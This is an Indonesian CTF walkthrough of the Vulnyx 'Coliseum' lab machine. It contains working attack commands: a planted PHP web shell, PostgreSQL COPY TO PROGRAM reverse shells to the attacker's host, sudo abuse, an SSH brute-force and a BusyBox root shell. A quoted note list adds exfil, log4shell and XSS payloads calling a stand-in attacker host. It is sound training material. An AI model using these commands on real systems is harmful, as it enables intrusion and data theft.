---
layout: post
title: "Vulnyx-Coliseum"
date: 2025-12-16 22:11:00 +0700
categories: [Vulnyx, Medium]
tags: [postgresql, rce, caesar-cipher, privilege-escalation, linux, web-security, automation]
image:
  path: /assets/img/post/Vulnyx-Coliseum/banner.png
author: HanzXD
---

## Overview

Coliseum adalah mesin CTF tingkat medium dari Vulnyx yang menampilkan eksploitasi PostgreSQL superuser privilege, 200+ nested Caesar cipher ZIP files, dan privilege escalation via BusyBox. Challenge ini membutuhkan automation scripting untuk menyelesaikannya secara efisien.

**Difficulty:** Medium  
**Target IP:** 192.168.56.113

---

## Reconnaissance

### Port Scanning

Memulai dengan scanning menggunakan Nmap dan RustScan:

```bash
nmap -sC -sV -p- 192.168.56.113
```

**Hasil Scan:**

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 10.0p2 Debian 7 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.65 ((Debian))
5432/tcp open  postgresql PostgreSQL DB
```

**Service yang teridentifikasi:**
- **Port 22** - SSH (OpenSSH 10.0p2)
- **Port 80** - HTTP (Apache 2.4.65)
- **Port 5432** - PostgreSQL Database

**Informasi SSL Certificate:**
- Common Name: coliseum
- Subject Alternative Name: DNS:coliseum
- Valid from: 2025-12-05 to 2035-12-03

**Hasil RustScan:**

```bash
rustscan -a 192.168.56.113
```

```
Open 192.168.56.113:22
Open 192.168.56.113:80
Open 192.168.56.113:5432
```

---

## Web Enumeration

### Akses Web Awal

Mengakses website melalui browser pada `http://192.168.56.113`:

![Homepage - Arena Entrance](/assets/img/post/Vulnyx-Coliseum/pict1.png)

Website menampilkan halaman "Arena Entrance" dengan tema Colosseum/gladiator yang menarik.

### Directory Bruteforcing

Menggunakan Feroxbuster untuk enumerasi direktori:

```bash
feroxbuster -u http://192.168.56.113/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Endpoint Menarik yang Ditemukan:**

```
200 GET  /index.php
200 GET  /login.php
200 GET  /register.php
301 GET  /assets => /assets/
301 GET  /lib => /lib/
301 GET  /tools => /tools/

File di /lib:
200 GET  /lib/security.php (0 bytes)
200 GET  /lib/session.php (0 bytes)
200 GET  /lib/auth.php (0 bytes)
200 GET  /lib/database.php (0 bytes)

File di /tools:
200 GET  /tools/backup.php (0 bytes)

Assets:
200 GET  /assets/app.js
200 GET  /assets/style.css
200 GET  /assets/coliseo.png
200 GET  /assets/audio.mp3
200 GET  /assets/blood.png
200 GET  /assets/good.png
```

**Catatan:** File PHP di `/lib` dan `/tools` tidak dapat dibaca langsung karena di-execute oleh server.

### Registrasi & Login User

Website memiliki fitur register dan login. Mari kita buat akun baru:

![Halaman Registrasi](/assets/img/post/Vulnyx-Coliseum/pict2.png)

**Akun Test:**
- Username: hanz
- Email: hanz@sandwich.nyx
- Password: password123

Setelah login berhasil, kita diarahkan ke dashboard profile:

![Dashboard Profile](/assets/img/post/Vulnyx-Coliseum/pict3.png)

### Analisis Dashboard Profile

Dashboard menampilkan beberapa informasi menarik:

1. **Armory Note** - Field untuk menulis catatan (sudah ditest untuk SSTI, tapi tidak vulnerable)
2. **Gladiator ID** - Parameter dalam URL: `?gladiator_id=CDLXIV`

**Pola URL:**
```
http://192.168.56.113/profile.php?gladiator_id=CDLXIV
```

Gladiator ID menggunakan **Roman Numerals** (angka romawi). Ini menarik untuk diselidiki!

---

## Enumerasi Gladiator ID

### Fuzzing Roman Numeral

Karena manual testing untuk semua kemungkinan Roman numerals akan memakan waktu sangat lama, saya membuat custom tool untuk melakukan fuzzing secara otomatis.

**Strategi:**
- Generate wordlist Roman numerals (1-1000)
- Fuzz parameter `gladiator_id`
- Deteksi anomali berdasarkan response size

**Tool tersedia di:** https://github.com/ZeroMAN555/fuzzer/blob/main/fuzzer.py

### Menjalankan Fuzzer

```bash
python3 roman_fuzzer.py -u http://192.168.56.113/profile.php -p gladiator_id -r 1-1000
```

**Anomali Terdeteksi:**

```
ANOMALIES DETECTED (Different Size):
----------------------------------------------------------------------
[200] CDVIII  (408)  | Size: 2541 (+713)
[200] CDIX    (409)  | Size: 2584 (+756)
[200] CDXVII  (417)  | Size: 2551 (+723)
[200] CDXVIII (418)  | Size: 2565 (+737)
[200] CDXIX   (419)  | Size: 2534 (+706)
[200] CDXXX   (430)  | Size: 2541 (+713)
[200] CDXXXI  (431)  | Size: 2533 (+705)
[200] CDXXXII (432)  | Size: 2545 (+717)
[200] CDXXXIII(433)  | Size: 2613 (+785)
[200] CDXXXIV (434)  | Size: 2537 (+709)
[200] CDL     (450)  | Size: 2538 (+710)
[200] CDLI    (451)  | Size: 2534 (+706)
[200] CDLII   (452)  | Size: 2542 (+714)
[200] CDLIII  (453)  | Size: 2532 (+704)
[200] CDLIV   (454)  | Size: 2552 (+724)
[200] CDLV    (455)  | Size: 2545 (+717)
[200] CDLVI   (456)  | Size: 2551 (+723)
[200] CDLVII  (457)  | Size: 2594 (+766)
[200] CDLVIII (458)  | Size: 2530 (+702)
[200] CDLIX   (459)  | Size: 2527 (+699)
[200] CDLX    (460)  | Size: 2556 (+728)
[200] CDLXI   (461)  | Size: 2555 (+727)
[200] CDLXIV  (464)  | Size: 3061 (+1233)
```

### Note-Note Menarik yang Ditemukan

Mengakses setiap ID yang terdeteksi, saya menemukan banyak "armory notes" yang berisi berbagai hacking techniques dan clues:

**Note Penting:**

1. `nmap -sC -sV -O 10.10.0.0/24; mark ssh banner for creds reuse`
2. **`pgsql:host=db;port=5432;dbname=colosseum_app;sslmode=disable;password=0Qn5311Ov4NQApPX9G4Z;user=colosseum_user`** ⭐
3. `sqlmap -u "http://target/login.php" --risk=3 --batch`
4. `ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
5. `jwt brute: kid header LFI -> /var/www/html/jwt.key`
6. `bloodhound: Sharphound zip upload to neo4j, abuse DCSync`
7. `pivot: chisel socks5 1080 -> proxychains nmap`
8. `XSS payload: <script src=//attacker/pwn.js></script>`
9. `wfuzz -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
10. `kerberoast: Rubeus asktgt / stealth TGS roasting`
11. `responder on LLMNR/NetBIOS; crack hashes with hashcat -m 5600`
12. `CVE-2021-4034: pkexec exploit to root; drop bash suid`
13. `sudo -l -> nano escape: ^R^X then !/bin/sh`
14. `zip slip: payload ../var/www/html/shell.php in tar.gz`
15. `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.99 LPORT=9001`
16. `CORS misconfig: Access-Control-Allow-Origin: * with credentials`
17. `SSTI in Jinja: {{"__class__".__mro__[2].__subclasses__()}}`
18. `gobuster dir -x php,txt,bak -u http://target`
19. `exfil: curl -T loot.tar.gz ftp://attacker:21`
20. `log4shell: ${jndi:ldap://attacker/a} in User-Agent`
21. `pwn: checksec (NX/PIE/RELRO); overwrite GOT`
22. `JWT none alg fallback; forge admin token with kid pointing /etc/passwd`

**Yang Paling Penting:** Note #2 memberikan **kredensial PostgreSQL**! 🎯

---

## Akses Database PostgreSQL

### Koneksi ke PostgreSQL

Dari note yang ditemukan, kita mendapatkan kredensial database:

**Kredensial Database:**
```
Host: 192.168.56.113
Port: 5432
Database: colosseum_app
User: colosseum_user
Password: 0Qn5311Ov4NQApPX9G4Z
```

**Melakukan Koneksi:**

```bash
psql -h 192.168.56.113 -U colosseum_user -d colosseum_app
```

```
Password for user colosseum_user: 0Qn5311Ov4NQApPX9G4Z
psql (17.5 (Debian 17.5-1), server 17.6 (Debian 17.6-0+deb13u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384)
Type "help" for help.

colosseum_app=#
```

**Koneksi Berhasil!** 🎉

### Enumerasi Database

**Melihat daftar tabel:**

```sql
\dt
```

**Dump tabel users:**

```sql
SELECT * FROM users;
```

**Hasil:**

```
 id  |    username     |             email             | gladiator_id | password_hash | created_at
-----+-----------------+-------------------------------+--------------+---------------+------------
 408 | Prisco          | prisco@colosseum.nyx          | CDVIII       | $2y$10$UPC... | 2025-12-06
 409 | Vero            | vero@colosseum.nyx            | CDIX         | $2y$10$UPC... | 2025-12-06
 417 | Carpóforo       | carpoforo@colosseum.nyx       | CDXVII       | $2y$10$UPC... | 2025-12-06
 [... 19 users lainnya ...]
 464 | hanz            | hanz@sandwich.nyx             | CDLXIV       | $2y$12$42m... | 2025-12-16
```

**Observasi:**
- Semua default users menggunakan password hash yang sama
- Menggunakan bcrypt hashing ($2y$)
- Tidak ada column `role` atau `is_admin` untuk privilege escalation
- Hash cracking akan memakan waktu lama

### Pengecekan Privilege PostgreSQL

**Testing status superuser:**

```sql
SELECT usename, usesuper FROM pg_user;
```

**Hasil:**

```
    usename     | usesuper 
----------------+----------
 postgres       | t
 colosseum_user | t
```

**TEMUAN KRITIS:** User `colosseum_user` adalah **SUPERUSER**! 🚨

**Implikasi:**
- Akses filesystem read/write
- Potensi Remote Code Execution
- Kontrol penuh terhadap database

---

## Eksploitasi PostgreSQL Superuser

### Membaca File Server

**Testing kemampuan baca file:**

```sql
SELECT pg_read_file('/etc/passwd', 0, 500);
```

**Hasil:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[... dipotong ...]
proxy:x:13:13:proxy:/bin
```

**Pembacaan file berhasil!** Sekarang mari kita baca source code aplikasi web.

### Membaca Konfigurasi Apache

**Mengkonfirmasi DocumentRoot:**

```sql
SELECT pg_read_file('/etc/apache2/sites-enabled/000-default.conf', 0, 1000);
```

**Hasil:**

```xml
<VirtualHost *:80>
    ServerName 192.168.1.113
    ServerAdmin webmaster@localhost
    
    DocumentRoot /var/www/html
    
    SetEnv DB_DSN  "pgsql:host=127.0.0.1;port=5432;dbname=colosseum_app"
    SetEnv DB_USER "colosseum_user"
    SetEnv DB_PASS "0Qn5311Ov4NQApPX9G4Z"
    
    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
```

**DocumentRoot dikonfirmasi:** `/var/www/html`

### Membaca Source Code PHP

**Membaca index.php:**

```sql
SELECT pg_read_file('/var/www/html/index.php', 0, 3000);
```

![Membaca index.php](/assets/img/post/Vulnyx-Coliseum/pict4.png)

**Membaca backup.php:**

```sql
SELECT pg_read_file('/var/www/html/tools/backup.php', 0, 3000);
```

**Hasil:**

```php
<?php
/**
 Please remember to implement the PHP-based backup system.
 The script should be located at /var/www/html/tools/backup.php 
 and be executable via /usr/bin/php.
 Make sure it supports all required backup options and handles 
 errors and logging properly.
**/
```

**Temuan Penting:**
- `backup.php` adalah **placeholder** - belum diimplementasikan
- Dirancang untuk dieksekusi via `/usr/bin/php`
- Kemungkinan dipanggil via cron, sudo, atau systemd

Ini bisa jadi vektor privilege escalation kita! 🎯

---

## Initial Access via RCE PostgreSQL

### Menanam Web Shell

Karena kita bisa menulis file, mari kita tanam web shell:

```sql
COPY (
  SELECT '<?php shell_exec("bash -c ''bash -i >& /dev/tcp/192.168.56.109/4444 0>&1''"); ?>'
) TO '/var/www/html/tools/shell.php';
```

![Menanam web shell](/assets/img/post/Vulnyx-Coliseum/pict5.png)

**Shell berhasil ditanam!** Sekarang trigger dengan mengakses:
```
http://192.168.56.113/tools/shell.php
```

### Eksekusi Command PostgreSQL

Karena web shell tidak memberikan response yang stabil, mari kita coba eksekusi command langsung via PostgreSQL.

**PostgreSQL memiliki built-in command execution via:**
```sql
COPY (...) TO PROGRAM 'command'
```

**Testing eksekusi command:**

```sql
COPY (SELECT '') TO PROGRAM 'id';
```

```
COPY 1
```

Tidak ada output yang terlihat, tapi command tereksekusi! Mari coba tulis output ke file.

### Debugging Masalah Output

**Percobaan 1 - Menulis ke /tmp:**

```sql
COPY (SELECT '') TO PROGRAM 'id > /tmp/proof.txt';
```

**Mengecek hasil:**

```bash
www-data@coliseum:/var/www/html/tools$ cat /tmp/proof.txt
cat: /tmp/proof.txt: No such file or directory
```

**Kenapa /tmp/proof.txt tidak ada?**

`COPY ... TO PROGRAM` berjalan sebagai user `postgres`, dengan working directory PostgreSQL:
```
/var/lib/postgresql/17/main
```

File dibuat dalam konteks PostgreSQL, bukan di system's `/tmp`.

**Percobaan 2 - Direktori PostgreSQL:**

```sql
COPY (SELECT '') TO PROGRAM 'id > /var/lib/postgresql/proof.txt';
```

**Mengecek:**

```bash
www-data@coliseum:/var/www/html/tools$ cat /var/lib/postgresql/proof.txt
cat: /var/lib/postgresql/proof.txt: Permission denied
```

**Permission denied berarti file berhasil dibuat!** ✅

### Mendapatkan Reverse Shell sebagai postgres

**Setup listener:**

```bash
penelope -p 1337
```

**Eksekusi reverse shell:**

```sql
COPY (
  SELECT ''
) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.56.109/1337 0>&1"';
```

**Shell diterima:**

```bash
$ penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337
[+] Got reverse shell from coliseum~192.168.56.113-Linux-x86_64 😍
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY

postgres@coliseum:/var/lib/postgresql/17/main$ whoami; id
postgres
uid=101(postgres) gid=104(postgres) groups=104(postgres),103(ssl-cert)
```

**Initial access berhasil sebagai user `postgres`!** 🎉

---

## Lateral Movement - postgres ke cesar

### Enumerasi sebagai postgres

**Mengecek sudo privileges:**

```bash
postgres@coliseum:/var/lib/postgresql/17/main$ sudo -l
User postgres may run the following commands on coliseum:
    (cesar) NOPASSWD: /usr/bin/php /var/www/html/tools/backup.php
```

**Temuan Penting:**
- postgres dapat menjalankan `backup.php` sebagai user `cesar` tanpa password
- backup.php dimiliki oleh `www-data:postgres`
- postgres memiliki write permission pada backup.php

**File permissions:**

```bash
postgres@coliseum:/var/lib/postgresql/17/main$ ls -la /var/www/html/tools
total 16
drwxrwxr-x 2 www-data postgres 4096 Dec 17 21:24 .
drwxr-xr-x 6 www-data www-data 4096 Dec  8 20:04 ..
-rw-rw-r-- 1 www-data postgres  262 Dec 10 20:25 backup.php
-rw-r--r-- 1 postgres postgres   79 Dec 17 19:37 shell.php
```

**Rencana Eksploitasi:**
1. Edit `backup.php` untuk mengeksekusi shell
2. Jalankan `backup.php` sebagai cesar menggunakan sudo
3. Dapatkan shell sebagai cesar

### Eksploitasi backup.php

**Mengedit backup.php:**

```bash
postgres@coliseum:/var/www/html/tools$ nano backup.php
```

**Konten baru:**

```php
<?php system("/bin/bash"); ?>
```

**Eksekusi sebagai cesar:**

```bash
postgres@coliseum:/var/www/html/tools$ sudo -u cesar /usr/bin/php /var/www/html/tools/backup.php
cesar@coliseum:/var/www/html/tools$ whoami; id
cesar
uid=1000(cesar) gid=1000(cesar) groups=1000(cesar),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
```

**Lateral movement berhasil!** Sekarang kita adalah user `cesar`. 🎯

### User Flag

```bash
cesar@coliseum:~$ cat user.txt
677a094d0f3a3f0d64efe9c8594e8733
```

**User Flag Berhasil Didapatkan!** 🚩

---

## Challenge Caesar Cipher

### Menemukan Puzzle

```bash
cesar@coliseum:~$ ls -la
total 148
drwxr-x--- 2 cesar cesar   4096 Dec 16 19:25 .
drwxr-xr-x 3 root  root    4096 Dec  5 23:40 ..
-rw------- 1 cesar cesar    187 Dec 16 19:25 .bash_history
-rw-r--r-- 1 cesar cesar    220 Apr  6  2025 .bash_logout
-rw-r--r-- 1 cesar cesar   3526 Apr  6  2025 .bashrc
-rw-r--r-- 1 cesar cesar    807 Apr  6  2025 .profile
-rw-r--r-- 1 cesar cesar 121350 Dec  6 00:54 cesar_I.zip
-rw-r--r-- 1 cesar cesar    353 Dec  6 00:54 initial_hint.txt
-rw-r--r-- 1 cesar cesar     33 Dec  6 00:47 user.txt
```

**Dua file menarik:**
- `cesar_I.zip` - Archive yang diproteksi password
- `initial_hint.txt` - Hint untuk membuka

### Membaca Hint

```bash
cesar@coliseum:~$ cat initial_hint.txt
```

```
At the entrance of the Coliseum, the very first gate is sealed.
Its key was altered on Caesar's command, shifting each symbol along
a secret line of characters.

The elders only left this inscription for you:

KEY_FOR_CAESAR: uqclxh7glp

They also whispered that this secret line was forged
from all the lowercase letters… followed by the ten digits.
```

**Analisis:**
- Ini adalah puzzle **Caesar Cipher**
- Key terenkripsi: `uqclxh7glp`
- Custom alphabet: `abcdefghijklmnopqrstuvwxyz0123456789`
- ROT cipher dengan custom alphabet

### Membuat Script Decoder

**decoder_v1.py:**

```python
import subprocess

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
cipher = "uqclxh7glp"

for shift in range(len(alphabet)):
    plain = ""
    for c in cipher:
        if c in alphabet:
            idx = alphabet.index(c)
            plain += alphabet[(idx - shift) % len(alphabet)]
    
    # Coba unzip
    result = subprocess.run(
        ['unzip', '-P', plain, 'cesar_I.zip'],
        capture_output=True, text=True
    )
    
    if 'incorrect password' not in result.stderr:
        print(f"[+] PASSWORD FOUND: {plain} (shift {shift})")
        break
    else:
        print(f"[-] Shift {shift}: {plain}")
```

### Ekstraksi ZIP Pertama

**Transfer file ke mesin attacker:**

```bash
# Di target - start Python HTTP server
cesar@coliseum:~$ python3 -m http.server 8000

# Di mesin attacker
wget http://192.168.56.113:8000/cesar_I.zip
wget http://192.168.56.113:8000/initial_hint.txt
```

**Menjalankan decoder:**

```bash
python3 decoder.py
```

**Output:**

```
[-] Shift 0: uqclxh7glp
[-] Shift 1: tpbkwg6fko
[-] Shift 2: soajvf5ejn
[-] Shift 3: rn9iue4dim
[-] Shift 4: qm8htd3chl
[-] Shift 5: pl7gsc2bgk
[-] Shift 6: ok6frb1afj
[-] Shift 7: nj5eqa09ei
[-] Shift 8: mi4dp9z8dh
[-] Shift 9: lh3co8y7cg
[-] Shift 10: kg2bn7x6bf
[-] Shift 11: jf1am6w5ae
[-] Shift 12: ie09l5v49d
[+] PASSWORD FOUND: hdz8k4u38c (shift 13)
```

**Password pertama ditemukan:** `hdz8k4u38c`

**File yang diekstrak:**

```bash
$ ls
cesar_II.zip  cesar_I.zip  decoder.py  initial_hint.txt  pista.txt
```

**Membaca pista.txt:**

```
Gladiator, you have entered chamber I of the Coliseum.

The next iron gate is locked with a secret that Caesar himself ordered to
be twisted — each symbol shifted along an unseen line of characters.

All that remains of the original key is this distorted inscription:

KEY_FOR_CAESAR: cvwbdaangl
```

### Pola Mulai Terlihat

**Kesadaran:**
1. Setiap ZIP berisi ZIP lainnya
2. Setiap `pista.txt` berisi cipher untuk ZIP berikutnya
3. Penamaan file: `cesar_I.zip`, `cesar_II.zip`, ..., `cesar_CC.zip` (angka Romawi)

Berdasarkan hint sebelumnya:
> `nmap -sC -sV -O 10.10.0.0/24; mark ssh banner for creds reuse`

**Artinya:** Kita perlu mengumpulkan semua password untuk bruteforce SSH! 🎯

**Masalah:** Ekstraksi manual akan memakan waktu SELAMANYA untuk 200+ ZIP! 

**Solusi:** Otomasi penuh diperlukan!

---

## Otomasi Challenge Caesar Cipher

### Script Decoder yang Ditingkatkan

**decoder_v2.py:**

```python
#!/usr/bin/env python3
import subprocess
import sys
import re
import os

ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"
WORDLIST_FILE = "wordlist.txt"

def roman_to_int(roman):
    """Konversi angka Romawi ke integer"""
    vals = {'I':1, 'V':5, 'X':10, 'L':50, 'C':100}
    total = 0
    prev = 0
    for c in reversed(roman):
        v = vals[c]
        if v < prev:
            total -= v
        else:
            total += v
            prev = v
    return total

def int_to_roman(num):
    """Konversi integer ke angka Romawi"""
    mapping = [
        (100,'C'), (90,'XC'), (50,'L'), (40,'XL'),
        (10,'X'), (9,'IX'), (5,'V'), (4,'IV'), (1,'I')
    ]
    res = ""
    for v, r in mapping:
        while num >= v:
            res += r
            num -= v
    return res

def extract_cipher():
    """Ekstrak cipher dari pista.txt"""
    if not os.path.exists("pista.txt"):
        return None
    with open("pista.txt") as f:
        m = re.search(r'KEY_FOR_CAESAR:\s*([a-z0-9]+)', f.read())
        return m.group(1) if m else None

def save_password(password, zipname):
    """Simpan password yang ditemukan ke wordlist file"""
    with open(WORDLIST_FILE, "a") as f:
        f.write(f"{password}\n")
    print(f"[✓] Password disimpan ke {WORDLIST_FILE}")

def crack_zip(zipname, cipher):
    """Crack ZIP menggunakan Caesar cipher dengan semua kemungkinan shift"""
    print(f"\n[*] Cracking {zipname} | cipher: {cipher}")
    
    for shift in range(len(ALPHABET)):
        plain = ""
        for c in cipher:
            idx = ALPHABET.index(c)
            plain += ALPHABET[(idx - shift) % len(ALPHABET)]
        
        # Test password
        p = subprocess.run(
            ["unzip", "-t", "-P", plain, zipname],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=3
        )
        
        if "incorrect password" not in (p.stdout + p.stderr).lower():
            print(f"[+] PASSWORD DITEMUKAN: {plain} (shift {shift})")
            
            # Simpan password ke wordlist
            save_password(plain, zipname)
            
            # Ekstrak file zip
            subprocess.run(
                ["unzip", "-o", "-P", plain, zipname],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return True
    
    print("[!] Password tidak ditemukan")
    return False

def main():
    start = int(sys.argv[1]) if len(sys.argv) > 1 else 1
    
    # Buat file wordlist
    with open(WORDLIST_FILE, "w") as f:
        f.write("# Caesar ZIP Password Wordlist\n")
        f.write("# Password yang dihasilkan dari proses cracking\n\n")
    
    print(f"[+] Mulai dari cesar_{int_to_roman(start)}.zip")
    print(f"[+] Wordlist akan disimpan di: {WORDLIST_FILE}\n")
    
    current = start
    passwords_found = 0
    
    while True:
        roman = int_to_roman(current)
        zipname = f"cesar_{roman}.zip"
        
        # Cek apakah ZIP ada
        if not os.path.exists(zipname):
            print(f"\n[!] {zipname} tidak ditemukan → STOP")
            break
        
        # Ekstrak cipher dari pista.txt
        cipher = extract_cipher()
        if not cipher:
            print("[!] Cipher tidak ditemukan di pista.txt → STOP")
            break
        
        # Crack ZIP
        if not crack_zip(zipname, cipher):
            print("[!] Gagal crack → STOP")
            break
        
        passwords_found += 1
        current += 1
    
    print(f"\n{'='*50}")
    print(f"[✓] SELESAI! Total password ditemukan: {passwords_found}")
    print(f"[✓] Wordlist disimpan di: {WORDLIST_FILE}")
    print(f"{'='*50}")

if __name__ == "__main__":
    main()
```

### Menjalankan Otomasi

**Eksekusi decoder:**

```bash
python3 decoder.py 2  # Mulai dari cesar_II.zip
```

**Output:**

```
[+] Mulai dari cesar_II.zip
[+] Wordlist akan disimpan di: wordlist.txt

[*] Cracking cesar_II.zip | cipher: cvwbdaangl
[+] PASSWORD DITEMUKAN: 65tp70vok6 (shift 13)
[✓] Password disimpan ke wordlist.txt

[*] Cracking cesar_III.zip | cipher: xj4ra3bptk
[+] PASSWORD DITEMUKAN: qd3k13utod (shift 7)
[✓] Password disimpan ke wordlist.txt

[... proses berlanjut ...]

[*] Cracking cesar_CC.zip | cipher: yw9mf2hqzn
[+] PASSWORD DITEMUKAN: rm8u4veyyn (shift 10)
[✓] Password disimpan ke wordlist.txt

[!] cesar_CCI.zip tidak ditemukan → STOP

==================================================
[✓] SELESAI! Total password ditemukan: 199
[✓] Wordlist disimpan di: wordlist.txt
==================================================
```

**Hasil:** 199 password berhasil diekstrak dan disimpan! 🎉

Tanpa otomasi, ini akan memakan waktu berjam-jam atau bahkan berhari-hari untuk diselesaikan secara manual!

---

## SSH Bruteforce dengan Password yang Terkumpul

### Serangan Credential Reuse

Ingat hint nya:
> `mark ssh banner for creds reuse`

Semua password itu mungkin digunakan ulang untuk akses SSH!

**Menggunakan Medusa untuk SSH bruteforce:**

```bash
medusa -h 192.168.56.113 -u cesar -P wordlist.txt -M ssh -t 1 -n 22
```

**Parameter:**
- `-h`: Target host
- `-u`: Username (cesar)
- `-P`: Password wordlist
- `-M ssh`: Modul SSH
- `-t 1`: Single thread (lebih aman untuk SSH)
- `-n 22`: Port 22

**Progress bruteforce:**

```
ACCOUNT CHECK: [ssh] Host: 192.168.56.113 User: cesar Password: eho6at5xz7 (171 of 201)
ACCOUNT CHECK: [ssh] Host: 192.168.56.113 User: cesar Password: zok3e97v6e (172 of 201)
ACCOUNT CHECK: [ssh] Host: 192.168.56.113 User: cesar Password: qajgytnljb (173 of 201)
ACCOUNT CHECK: [ssh] Host: 192.168.56.113 User: cesar Password: uj5ch7zkud (174 of 201)
ACCOUNT CHECK: [ssh] Host: 192.168.56.113 User: cesar Password: vd2vzzl9js (175 of 201)
ACCOUNT CHECK: [ssh] Host: 192.168.56.113 User: cesar Password: 65tp70vok6 (176 of 201)
ACCOUNT FOUND: [ssh] Host: 192.168.56.113 User: cesar Password: 65tp70vok6 [SUCCESS]
```

**Kredensial SSH Ditemukan:**
- **Username:** cesar
- **Password:** 65tp70vok6

Hint nya benar - password reuse berhasil! ✅

---

## Akses SSH sebagai cesar

### Login via SSH

```bash
ssh cesar@192.168.56.113
```

```
cesar@192.168.56.113's password: 65tp70vok6

Linux coliseum 6.12.57+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.57-1

Last login: Mon Dec  8 23:13:48 2025 from 192.168.1.146
cesar@coliseum:~$ id
uid=1000(cesar) gid=1000(cesar) groups=1000(cesar),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
```

**Akses SSH berhasil!** Sekarang dengan shell yang stabil. 🎯

### Mengecek Sudo Privileges

```bash
cesar@coliseum:~$ sudo -l
[sudo] password for cesar: 65tp70vok6

Matching Defaults entries for cesar on coliseum:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User cesar may run the following commands on coliseum:
    (root) /usr/bin/busybox
```

**JACKPOT!** User cesar dapat menjalankan **BusyBox** sebagai root! 🚨

---

## Privilege Escalation ke Root

### Memahami BusyBox

**Apa itu BusyBox?**
- Multi-call binary yang menggabungkan banyak Unix utilities
- Berisi ratusan command dalam satu executable
- Salah satu built-in applet nya adalah `sh` (shell)

**Strategi Eksploitasi:**
- BusyBox berjalan sebagai root
- BusyBox memiliki applet `sh`
- Kita bisa spawn root shell!

### GTFOBins - BusyBox

Mengecek [GTFOBins](https://gtfobins.github.io/gtfobins/busybox/):

```bash
sudo busybox sh
```

Ini akan spawn shell dengan preserved privileges!

### Spawn Root Shell

```bash
cesar@coliseum:~$ sudo /usr/bin/busybox sh
```

```
BusyBox v1.37.0 (Debian 1:1.37.0-6+b3) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/home/cesar # id
uid=0(root) gid=0(root) groups=0(root)

/home/cesar # whoami
root
```

**AKSES ROOT BERHASIL!** 🎉👑

### Root Flag

```bash
/home/cesar # cd /root
~ # ls
root.txt

~ # cat root.txt
c74221673c659c1e98e1b652261492ec
```

**Root Flag Berhasil Didapatkan!** 🚩

---

## Summary

### Flag yang Didapatkan

- **User Flag:** `677a094d0f3a3f0d64efe9c8594e8733`
- **Root Flag:** `c74221673c659c1e98e1b652261492ec`

### Attack Chain

1. **Reconnaissance** - Port scanning mengidentifikasi HTTP (80), SSH (22), dan PostgreSQL (5432)
2. **Web Enumeration** - Menemukan fitur registrasi/login dan dashboard profile
3. **Roman Numeral Fuzzing** - Membuat custom tool untuk fuzz parameter gladiator_id
4. **Information Disclosure** - Menemukan kredensial PostgreSQL di user notes
5. **PostgreSQL Access** - Koneksi ke database dengan kredensial yang terekspos
6. **Superuser Exploitation** - Menemukan colosseum_user memiliki superuser privileges
7. **File Read** - Menggunakan pg_read_file() untuk membaca file server yang sensitif
8. **RCE via PostgreSQL** - Mengeksekusi command menggunakan COPY ... TO PROGRAM
9. **Initial Access** - Mendapatkan reverse shell sebagai user postgres
10. **Lateral Movement #1** - Mengeksploitasi sudo privilege pada backup.php untuk menjadi cesar
11. **Caesar Cipher Challenge** - Otomasi ekstraksi 200+ nested ZIP files
12. **Password Collection** - Menghasilkan wordlist dari semua password ZIP
13. **SSH Bruteforce** - Menemukan password SSH cesar via credential reuse
14. **Privilege Escalation** - Mengeksploitasi sudo access ke BusyBox untuk root shell

### Teknik Utama yang Digunakan

- **Custom Fuzzing Tool** - Otomasi testing parameter Roman numeral
- **PostgreSQL Superuser Exploitation** - File read/write dan command execution
- **COPY TO PROGRAM** - Fitur eksekusi command PostgreSQL
- **Caesar Cipher Automation** - Script Python untuk crack 200+ ZIP
- **Credential Reuse** - SSH bruteforce dengan password yang terkumpul
- **BusyBox Shell Escape** - Sudo privilege escalation

### Pelajaran Penting

- **Database superuser privileges** sangat berbahaya - setara dengan shell access
- **Otomasi adalah kunci** - Pekerjaan manual pada 200+ ZIP tidak praktis
- **Credential reuse** adalah kerentanan umum dalam skenario dunia nyata
- **Information disclosure** dalam konten user-generated dapat mengekspos kredensial kritis
- **Custom tooling** sering diperlukan untuk CTF challenge yang kompleks
- **BusyBox** adalah binary powerful yang tidak boleh memiliki unrestricted sudo access

---

## Tools & Scripts

### Custom Tools yang Dibuat

**1. Roman Numeral Fuzzer** (untuk enumerasi gladiator_id)
```python
# Menghasilkan wordlist angka Romawi dan fuzz parameter web
# Mendeteksi anomali berdasarkan perbedaan response size
```

**2. Caesar Cipher Decoder** (untuk otomasi ZIP)
```python
# Otomatis crack nested ZIP files
# Ekstrak cipher dari pista.txt
# Menghasilkan password wordlist untuk SSH bruteforce
```

### Tools yang Digunakan

- **Nmap** - Network scanning dan service detection
- **RustScan** - Fast port scanner
- **Feroxbuster** - Directory dan file bruteforcing
- **PostgreSQL Client** - Akses dan eksploitasi database
- **Penelope** - Reverse shell handler dengan auto-upgrade
